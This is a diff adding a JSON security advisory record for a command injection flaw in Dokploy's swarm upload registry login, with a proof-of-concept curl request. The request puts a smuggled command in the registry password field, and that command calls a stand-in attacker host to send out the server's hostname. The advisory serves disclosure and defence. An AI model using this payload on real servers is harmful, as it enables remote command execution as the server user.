@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-prwq-2mcm-mvhr",
+  "repo": {
+    "cve_id": "CVE-2026-72879",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "## Summary\r\n\r\nDokploy has a command injection vulnerability in the swarm upload registry login flow. The `getRegistryCommands()` function in `packages/server/src/utils/cluster/upload.ts` interpolates `registry.password` and `registry.registryUrl` directly into a shell command string without escaping, allowing an authenticated user to execute arbitrary OS commands when a swarm deployment with a configured registry is triggered.\r\n\r\nThe codebase already contains a correct mitigation: `safeDockerLoginCommand()` in `packages/server/src/services/registry.ts` performs proper single-quote escaping for Docker login commands. However, the swarm upload path does not use this safe function.\r\n\r\n## Proof of Concept\r\n\r\n```bash\r\n# Create or update a registry with injected password\r\ncurl -X POST \"http://TARGET/api/trpc/registry.create\" \\\r\n  -H \"Content-Type: application/json\" \\\r\n  -H \"Cookie: $SESSION\" \\\r\n  -d '{\r\n    \"json\": {\r\n      \"registryName\": \"evil-registry\",\r\n      \"registryType\": \"selfHosted\",\r\n      \"registryUrl\": \"registry.example.com\",\r\n      \"username\": \"user\",\r\n      \"password\": \"$(curl https://attacker.com/pwned?h=$(hostname))\",\r\n      \"imagePrefix\": \"\"\r\n    }\r\n  }'\r\n```\r\n\r\n## Impact\r\n\r\n- Execute arbitrary OS commands as the Dokploy server process user (often root)",
+    "ghsa_id": "GHSA-prwq-2mcm-mvhr",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-prwq-2mcm-mvhr",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-prwq-2mcm-mvhr"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72879"
+      }
+    ],
+    "published_at": "2026-07-21T23:25:07Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Command Injection via Registry Credentials in Swarm Upload",
+    "updated_at": "2026-08-13T17:18:21Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= 0.0.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
